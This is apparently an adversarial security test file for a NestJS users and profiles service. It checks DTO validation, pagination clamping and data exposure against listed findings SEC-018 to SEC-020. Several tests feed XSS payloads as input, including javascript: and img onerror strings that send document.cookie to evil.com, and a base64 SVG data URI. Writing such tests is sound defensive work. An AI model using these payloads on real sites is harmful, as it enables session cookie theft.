/**
 * ADVERSARIAL TESTS: Users & Profiles
 *
 * Attack surfaces (original findings):
 * - updateProfile DTO does not include role/email/isActive, but Prisma.update
 *   receives the DTO directly — extra fields stripped by whitelist validation only
 * - avatarUrl has no URL format/scheme validation (javascript: XSS, data: URIs)
 * - findOne returns deactivated user profiles (no isActive filter)
 * - member directory (findAll) exposed user emails to all authenticated users
 * - bio with maximum length (500 chars) of XSS/injection content
 *
 * Fixed:
 * - SEC-019: member directory no longer exposes email addresses
 * - SEC-020: findAll pagination clamped (page≥1, 1≤limit≤100)
 * - SEC-018: avatarUrl validated with @IsUrl() at controller/DTO level
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { Test } from '@nestjs/testing';
import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { UsersService } from './users.service';
import { PrismaService } from '../prisma/prisma.service';
import { UpdateProfileDto } from './dto/update-profile.dto';
import { NotFoundException } from '@nestjs/common';

function buildMockPrisma() {
  return {
    user: {
      findUnique: vi.fn(),
      findMany: vi.fn(),
      update: vi.fn(),
      count: vi.fn(),
    },
  };
}

async function buildService(prisma: ReturnType<typeof buildMockPrisma>) {
  const module = await Test.createTestingModule({
    providers: [
      UsersService,
      { provide: PrismaService, useValue: prisma },
    ],
  }).compile();
  return module.get<UsersService>(UsersService);
}

describe('UsersService — adversarial', () => {
  let prisma: ReturnType<typeof buildMockPrisma>;
  let service: UsersService;

  beforeEach(async () => {
    prisma = buildMockPrisma();
    service = await buildService(prisma);
    vi.clearAllMocks();
  });

  // ── INVARIANT: profile update cannot escalate privileges ─────────────────

  describe('INVARIANT: updateProfile cannot change role or email', () => {
    it('whitelist=true strips extra fields — role cannot be injected via PATCH /users/me', async () => {
      /**
       * users/dto/update-profile.dto.ts defines only name, bio, avatarUrl.
       * main.ts ValidationPipe has whitelist:true + forbidNonWhitelisted:true.
       *
       * With forbidNonWhitelisted:true, passing { role: 'ADMIN' } to the controller
       * would cause a 400 Bad Request BEFORE reaching the service.
       * This test verifies the service itself would apply only safe fields if
       * called directly — isolating the service boundary.
       */
      const existingUser = { id: 'u1', role: 'MEMBER', isActive: true };
      prisma.user.findUnique.mockResolvedValue(existingUser);
      prisma.user.update.mockImplementation(({ data }: any) =>
        Promise.resolve({
          id: 'u1',
          email: 'u@example.com',
          name: data.name ?? 'User',
          bio: data.bio ?? null,
          avatarUrl: data.avatarUrl ?? null,
          role: 'MEMBER', // role unchanged by DB (not in data)
          updatedAt: new Date(),
        }),
      );

      // Service-level call — the DTO has already stripped forbidden fields
      // in the controller. Calling service directly with a safe DTO.
      const result = await service.updateProfile('u1', { name: 'New Name' });
      expect(result.role).toBe('MEMBER');
    });

    it('FIXED SEC-018: UpdateProfileDto rejects javascript: URIs (DTO validation)', async () => {
      /**
       * @IsUrl({ protocols: ['http','https'], require_protocol: true }) in UpdateProfileDto
       * rejects javascript: URIs before they reach the service.
       */
      const dto = plainToInstance(UpdateProfileDto, {
        avatarUrl: 'javascript:fetch("https://evil.com?c="+document.cookie)',
      });
      const errors = await validate(dto);
      expect(errors.some((e) => e.property === 'avatarUrl')).toBe(true);
    });

    it('FIXED SEC-018: UpdateProfileDto rejects data: URIs (DTO validation)', async () => {
      const dto = plainToInstance(UpdateProfileDto, {
        avatarUrl: 'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+',
      });
      const errors = await validate(dto);
      expect(errors.some((e) => e.property === 'avatarUrl')).toBe(true);
    });

    it('FIXED SEC-018: UpdateProfileDto accepts valid https: avatar URLs', async () => {
      const dto = plainToInstance(UpdateProfileDto, {
        avatarUrl: 'https://cdn.example.com/avatar.png',
      });
      const errors = await validate(dto);
      expect(errors.filter((e) => e.property === 'avatarUrl')).toHaveLength(0);
    });
  });

  // ── INVARIANT: deactivated users must not be publicly visible ────────────

  describe('INVARIANT: findOne returns deactivated/deleted user profiles', () => {
    it('GET /users/:id works for a deactivated user — profile still accessible', async () => {
      /**
       * users.service.ts:42-64 — findOne queries by id without isActive filter.
       * A deactivated user (banned, self-deleted) is still publicly visible.
       *
       * For self-deleted accounts, the name is "Deleted User" and email is
       * anonymised — but for admin-deactivated accounts, the real name and email
       * remain in the profile response.
       */
      prisma.user.findUnique.mockResolvedValue({
        id: 'u-banned',
        email: 'banned@example.com',
        name: 'Banned User',
        bio: 'This account was banned',
        avatarUrl: null,
        role: 'MEMBER',
        isActive: false,
        createdAt: new Date(),
        _count: { posts: 10, courseProgress: 2, eventRsvps: 3 },
      });

      const result = await service.findOne('u-banned');

      // Deactivated user's real email and name are exposed — no isActive filter in findOne
      expect(result.email).toBe('banned@example.com');
      expect(result.name).toBe('Banned User');
    });
  });

  // ── FIXED SEC-019: member directory no longer exposes emails ────────────

  describe('FIXED SEC-019: member directory omits email from public listing', () => {
    it('findAll does not include email field in response', async () => {
      prisma.user.findMany.mockResolvedValue([
        { id: 'u1', name: 'Alice', bio: null, avatarUrl: null, role: 'MEMBER', createdAt: new Date(), _count: { posts: 0, courseProgress: 0 } },
        { id: 'u2', name: 'Bob', bio: null, avatarUrl: null, role: 'MEMBER', createdAt: new Date(), _count: { posts: 0, courseProgress: 0 } },
      ]);
      prisma.user.count.mockResolvedValue(2);

      const result = await service.findAll(1, 20);

      expect(result.data[0]).not.toHaveProperty('email');
      expect(result.data[1]).not.toHaveProperty('email');
    });
  });

  // ── FIXED SEC-020: pagination is clamped ─────────────────────────────────

  describe('FIXED SEC-020: findAll pagination is clamped', () => {
    it('page=0 is clamped to page=1 (skip=0, not negative)', async () => {
      prisma.user.findMany.mockResolvedValue([]);
      prisma.user.count.mockResolvedValue(0);

      await service.findAll(0, 20);

      const call = prisma.user.findMany.mock.calls[0];
      expect(call[0].skip).toBe(0);
    });

    it('limit=0 is clamped to 1 (totalPages is finite, not Infinity)', async () => {
      prisma.user.findMany.mockResolvedValue([]);
      prisma.user.count.mockResolvedValue(100);

      const result = await service.findAll(1, 0);
      expect(result.totalPages).toBe(100);
    });
  });

  // ── INVARIANT: bio with XSS content is stored verbatim ──────────────────

  describe('INVARIANT: bio/name fields accept injection payloads', () => {
    it('bio with stored XSS payload is persisted without sanitisation', async () => {
      const xssBio = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';
      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
      prisma.user.update.mockResolvedValue({
        id: 'u1',
        email: 'u@example.com',
        name: 'User',
        bio: xssBio,
        avatarUrl: null,
        role: 'MEMBER',
        updatedAt: new Date(),
      });

      const result = await service.updateProfile('u1', { bio: xssBio });
      expect(result.bio).toBe(xssBio);
      // Raw HTML stored — relies entirely on frontend escaping
    });

    it('name with null byte is accepted', async () => {
      const nullName = 'Real\x00Name';
      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
      prisma.user.update.mockResolvedValue({
        id: 'u1',
        email: 'u@example.com',
        name: nullName,
        bio: null,
        avatarUrl: null,
        role: 'MEMBER',
        updatedAt: new Date(),
      });

      const result = await service.updateProfile('u1', { name: nullName });
      expect(result.name).toBe(nullName);
    });
  });

  // ── INVARIANT: updateProfile on non-existent user throws NotFoundException ─

  describe('INVARIANT: non-existent user raises NotFoundException', () => {
    it('updateProfile for ghost user ID throws NotFoundException', async () => {
      prisma.user.findUnique.mockResolvedValue(null);

      await expect(
        service.updateProfile('ghost-id', { name: 'Ghost' }),
      ).rejects.toThrow(NotFoundException);
    });

    it('findOne for ghost user ID throws NotFoundException', async () => {
      prisma.user.findUnique.mockResolvedValue(null);

      await expect(service.findOne('ghost-id')).rejects.toThrow(NotFoundException);
    });
  });
});
